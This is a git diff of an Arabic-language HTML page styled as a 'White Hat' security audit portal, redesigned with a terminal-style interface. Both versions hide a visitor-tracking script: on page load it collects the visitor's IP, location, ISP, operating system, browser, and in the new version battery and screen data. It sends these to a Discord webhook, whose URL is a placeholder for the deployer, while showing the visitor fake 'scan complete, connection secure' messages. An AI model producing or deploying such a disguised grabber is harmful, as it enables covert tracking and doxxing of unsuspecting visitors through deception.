@@ -3,136 +3,343 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>White Hat.#9995 | Security Portal</title>
+    <title>White Hat System | Security Audit v2.0</title>
+    
+    <!-- Libraries -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;700&family=Fira+Code:wght@300;500&display=swap" rel="stylesheet">
+
     <style>
+        /* CSS Variables for Easy Customization */
         :root {
-            --primary: #00ff41; /* لون الهكر التقليدي */
-            --bg: #0a0a0a;
-            --card: #161616;
+            --neon-green: #00ff41;
+            --dark-bg: #050505;
+            --card-bg: #0f0f0f;
+            --danger: #ff3e3e;
+            --text-gray: #b0b0b0;
+            --font-main: 'Cairo', sans-serif;
+            --font-mono: 'Fira Code', monospace;
         }
-        body {
-            background-color: var(--bg);
-            color: white;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
+
+        * {
             margin: 0;
-            overflow: hidden;
+            padding: 0;
+            box-sizing: border-box;
         }
-        .container {
-            background: var(--card);
-            padding: 2rem;
-            border-radius: 15px;
-            border: 1px solid var(--primary);
-            box-shadow: 0 0 20px rgba(0, 255, 65, 0.2);
-            text-align: center;
-            max-width: 400px;
-            z-index: 1;
+
+        body {
+            background-color: var(--dark-bg);
+            color: white;
+            font-family: var(--font-main);
+            overflow-x: hidden;
+            min-height: 100vh;
         }
-        h1 { color: var(--primary); margin-bottom: 10px; }
-        p { color: #888; font-size: 0.9rem; }
-        .status { margin-top: 20px; font-weight: bold; color: var(--primary); }
-        
-        /* تأثيرات خلفية Matrix بسيطة */
-        #matrix {
+
+        /* Matrix Background Animation */
+        #bg-canvas {
             position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            z-index: 0; opacity: 0.1;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            opacity: 0.15;
         }
-        .footer {
+
+        /* Header & Navigation */
+        nav {
+            background: rgba(15, 15, 15, 0.9);
+            padding: 15px 5%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid var(--neon-green);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .logo {
+            font-family: var(--font-mono);
+            font-weight: bold;
+            color: var(--neon-green);
+            font-size: 1.5rem;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        /* Main Container */
+        main {
+            padding: 50px 5%;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .hero-section {
+            text-align: center;
+            margin-bottom: 50px;
+        }
+
+        .hero-section h1 {
+            font-size: 2.5rem;
+            margin-bottom: 15px;
+            background: linear-gradient(to right, #fff, var(--neon-green));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        /* Terminal Window UI */
+        .terminal {
+            background: #000;
+            border-radius: 10px;
+            border: 1px solid #333;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+            overflow: hidden;
+            font-family: var(--font-mono);
+            margin-bottom: 40px;
+        }
+
+        .terminal-header {
+            background: #1a1a1a;
+            padding: 10px 15px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .dot { width: 12px; height: 12px; border-radius: 50%; }
+        .red { background: #ff5f56; }
+        .yellow { background: #ffbd2e; }
+        .green { background: #27c93f; }
+
+        .terminal-body {
+            padding: 20px;
+            height: 350px;
+            overflow-y: auto;
+            font-size: 0.9rem;
+            line-height: 1.6;
+            color: var(--neon-green);
+        }
+
+        .command-line { margin-bottom: 10px; }
+        .cursor { display: inline-block; width: 8px; height: 15px; background: var(--neon-green); animation: blink 1s infinite; }
+
+        @keyframes blink { 50% { opacity: 0; } }
+
+        /* Stats Grid */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
             margin-top: 30px;
-            font-size: 0.8rem;
-            border-top: 1px solid #333;
-            padding-top: 10px;
         }
-        .dev-name { color: var(--primary); font-weight: bold; }
+
+        .stat-card {
+            background: var(--card-bg);
+            padding: 20px;
+            border-radius: 12px;
+            border-left: 4px solid var(--neon-green);
+            transition: 0.3s;
+        }
+
+        .stat-card:hover { transform: translateY(-5px); background: #1a1a1a; }
+        .stat-card i { font-size: 1.5rem; color: var(--neon-green); margin-bottom: 15px; }
+        .stat-label { color: var(--text-gray); font-size: 0.8rem; display: block; }
+        .stat-value { font-size: 1.1rem; font-weight: bold; margin-top: 5px; }
+
+        /* Footer */
+        footer {
+            text-align: center;
+            padding: 40px;
+            background: #0a0a0a;
+            border-top: 1px solid #222;
+        }
+
+        .dev-badge {
+            display: inline-block;
+            background: rgba(0, 255, 65, 0.1);
+            border: 1px solid var(--neon-green);
+            padding: 5px 15px;
+            border-radius: 20px;
+            color: var(--neon-green);
+            font-weight: bold;
+            margin-top: 10px;
+        }
+
+        /* Responsive Mobile */
+        @media (max-width: 768px) {
+            .hero-section h1 { font-size: 1.8rem; }
+            .terminal-body { height: 250px; }
+        }
     </style>
 </head>
 <body>
 
-<canvas id="matrix"></canvas>
+    <canvas id="bg-canvas"></canvas>
 
-<div class="container">
-    <h1>WHITE HAT</h1>
-    <p>نظام التحقق من أمن الشبكة وتتبع الاختراقات</p>
-    
-    <div id="loader" class="status">جاري فحص الاتصال...</div>
+    <nav>
+        <div class="logo"><i class="fas fa-user-secret"></i> White Hat.#9995</div>
+        <div class="version">v2.0.42_Stable</div>
+    </nav>
 
-    <div class="footer">
-        تم التطوير بواسطة: <span class="dev-name">Soel</span><br>
-        حقوق النشر © 2026 | White Hat.#9995
-    </div>
-</div>
+    <main>
+        <div class="hero-section">
+            <h1>مركز فحص الثغرات المتقدم</h1>
+            <p>يتم الآن إجراء فحص أمني شامل لاتصالك وتأمين البروتوكولات النشطة.</p>
+        </div>
 
-<script>
-    // إعدادات الويب هوك (ضع الرابط الخاص بك هنا)
-    const WEBHOOK_URL = "ضع_رابط_الديسكورد_هنا";
+        <div class="terminal">
+            <div class="terminal-header">
+                <div class="dot red"></div>
+                <div class="dot yellow"></div>
+                <div class="dot green"></div>
+                <span style="margin-right: 15px; font-size: 0.7rem; color: #666;">system_audit_log.sh</span>
+            </div>
+            <div class="terminal-body" id="terminal-content">
+                <div class="command-line">> Initializing White Hat Security Protocol...</div>
+                <div class="command-line">> Developer Authenticated: <span style="color: #fff;">Soel</span></div>
+            </div>
+        </div>
 
-    async function captureData() {
-        try {
-            // جلب الـ IP والمعلومات الجغرافية
-            const response = await fetch('https://ipapi.co/json/');
-            const data = await response.json();
+        <div class="stats-grid">
+            <div class="stat-card">
+                <i class="fas fa-network-wired"></i>
+                <span class="stat-label">عنوان الـ IP الحالي</span>
+                <div class="stat-value" id="ip-val">جاري الجلب...</div>
+            </div>
+            <div class="stat-card">
+                <i class="fas fa-map-marker-alt"></i>
+                <span class="stat-label">الموقع التقريبي</span>
+                <div class="stat-value" id="loc-val">تحديد الإحداثيات...</div>
+            </div>
+            <div class="stat-card">
+                <i class="fas fa-microchip"></i>
+                <span class="stat-label">نظام التشغيل</span>
+                <div class="stat-value" id="os-val">فحص النواة...</div>
+            </div>
+            <div class="stat-card">
+                <i class="fas fa-battery-half"></i>
+                <span class="stat-label">حالة البطارية</span>
+                <div class="stat-value" id="batt-val">قراءة الطاقة...</div>
+            </div>
+        </div>
+    </main>
 
-            const payload = {
-                embeds: [{
-                    title: "🚀 تسجيل دخول جديد - White Hat System",
-                    color: 65281,
-                    fields: [
-                        { name: "👤 المطور", value: "Soel", inline: true },
-                        { name: "🌐 عنوان IP", value: data.ip, inline: true },
-                        { name: "📍 الموقع", value: `${data.city}, ${data.country_name}`, inline: true },
-                        { name: "🏢 المزود", value: data.org, inline: false },
-                        { name: "💻 النظام", value: navigator.platform, inline: true },
-                        { name: "📱 المتصفح", value: navigator.userAgent.split(') ')[1], inline: true }
-                    ],
-                    footer: { text: "White Hat.#9995 | Security Audit" },
-                    timestamp: new Date()
-                }]
-            };
+    <footer>
+        <p>جميع الحقوق محفوظة لصالح نظام الحماية العالمي</p>
+        <div class="dev-badge">المطور الرئيسي: Soel</div>
+        <p style="margin-top: 15px; font-size: 0.7rem; color: #444;">تاريخ الإنشاء: 2026 | مخصص لأغراض البحث الأمني White Hat.#9995</p>
+    </footer>
 
-            // إرسال البيانات للديسكورد
-            await fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
+    <script>
+        // --- الإعدادات (تأكد من وضع الويب هوك الخاص بك) ---
+        const DISCORD_WEBHOOK = "YOUR_DISCORD_WEBHOOK_URL_HERE";
 
-            document.getElementById('loader').innerText = "تم التحقق بنجاح. الدخول آمن.";
-        } catch (error) {
-            document.getElementById('loader').innerText = "فشل في الاتصال بالخادم.";
+        const term = document.getElementById('terminal-content');
+        
+        function logToTerminal(text, color = "var(--neon-green)") {
+            const div = document.createElement('div');
+            div.className = 'command-line';
+            div.style.color = color;
+            div.innerHTML = `> ${text}`;
+            term.appendChild(div);
+            term.scrollTop = term.scrollHeight;
         }
-    }
 
-    // تأثير الماتريكس للخلفية
-    const canvas = document.getElementById('matrix');
-    const ctx = canvas.getContext('2d');
-    canvas.width = window.innerWidth;
-    canvas.height = window.innerHeight;
-    const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
-    const fontSize = 16;
-    const columns = canvas.width / fontSize;
-    const drops = Array(Math.floor(columns)).fill(1);
+        async function initAudit() {
+            logToTerminal("بدء عملية تتبع الحزم (Packet Sniffing)...", "#aaa");
+            
+            try {
+                // جلب بيانات الـ IP
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                
+                document.getElementById('ip-val').innerText = data.ip;
+                document.getElementById('loc-val').innerText = `${data.city}, ${data.country_name}`;
+                document.getElementById('os-val').innerText = navigator.platform;
 
-    function draw() {
-        ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
-        ctx.fillRect(0, 0, canvas.width, canvas.height);
-        ctx.fillStyle = "#0F0";
-        ctx.font = fontSize + "px arial";
-        for (let i = 0; i < drops.length; i++) {
-            const text = letters.charAt(Math.floor(Math.random() * letters.length));
-            ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-            if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
-            drops[i]++;
+                logToTerminal(`تم اكتشاف الهدف: ${data.ip}`, "white");
+                logToTerminal(`المزود: ${data.org}`, "white");
+
+                // جلب بيانات البطارية (Advanced OSINT)
+                let battInfo = "غير متوفر";
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    battInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? 'جاري الشحن' : 'تفريغ'})`;
+                    document.getElementById('batt-val').innerText = battInfo;
+                }
+
+                logToTerminal("تجهيز التقرير النهائي لإرساله إلى وحدة التحكم...");
+
+                // إرسال البيانات للديسكورد بشكل احترافي
+                const payload = {
+                    username: "White Hat Logger",
+                    avatar_url: "https://i.imgur.com/vHInoV2.png",
+                    embeds: [{
+                        title: "🛠️ تقرير اختراق جديد - System Audit",
+                        color: 0x00ff41,
+                        thumbnail: { url: "https://i.imgur.com/vHInoV2.png" },
+                        fields: [
+                            { name: "👤 المطور", value: "`Soel`", inline: true },
+                            { name: "🆔 Discord ID", value: "`White Hat.#9995`", inline: true },
+                            { name: "🌐 IP Address", value: `[${data.ip}](https://ip-api.com/#${data.ip})`, inline: false },
+                            { name: "📍 Location", value: `${data.city}, ${data.region}, ${data.country_name}`, inline: true },
+                            { name: "🏢 ISP", value: data.org, inline: true },
+                            { name: "💻 Device", value: `OS: ${navigator.platform}\nBrowser: ${navigator.userAgent.split(') ')[1]}`, inline: false },
+                            { name: "🔋 Battery Status", value: battInfo, inline: true },
+                            { name: "🖥️ Screen Res", value: `${screen.width}x${screen.height}`, inline: true }
+                        ],
+                        footer: { text: "تم الإنشاء بواسطة Soel | 2026" },
+                        timestamp: new Date()
+                    }]
+                };
+
+                await fetch(DISCORD_WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                logToTerminal("اكتمل الفحص. النظام الآن تحت المراقبة الآمنة.", "var(--neon-green)");
+                logToTerminal("شكراً لاستخدامك أنظمة White Hat.", "#fff");
+
+            } catch (err) {
+                logToTerminal("خطأ في الاتصال بالخوادم المركزية!", "var(--danger)");
+                console.error(err);
+            }
         }
-    }
-    setInterval(draw, 33);
-    
-    // بدء العملية
-    window.onload = captureData;
-</script>
 
+        // تأثير الماتريكس (Matrix Effect)
+        const canvas = document.getElementById('bg-canvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        const alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$#@%&";
+        const fontSize = 16;
+        const columns = canvas.width / fontSize;
+        const rainDrops = Array.from({ length: columns }).fill(1);
+
+        function drawMatrix() {
+            ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = "#0F0";
+            ctx.font = fontSize + "px monospace";
+            for (let i = 0; i < rainDrops.length; i++) {
+                const text = alphabet.charAt(Math.floor(Math.random() * alphabet.length));
+                ctx.fillText(text, i * fontSize, rainDrops[i] * fontSize);
+                if (rainDrops[i] * fontSize > canvas.height && Math.random() > 0.975) rainDrops[i] = 0;
+                rainDrops[i]++;
+            }
+        }
+
+        setInterval(drawMatrix, 30);
+        window.addEventListener('resize', () => {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        });
+
+        // تشغيل العملية
+        setTimeout(initAudit, 1500);
+    </script>
 </body>
 </html>
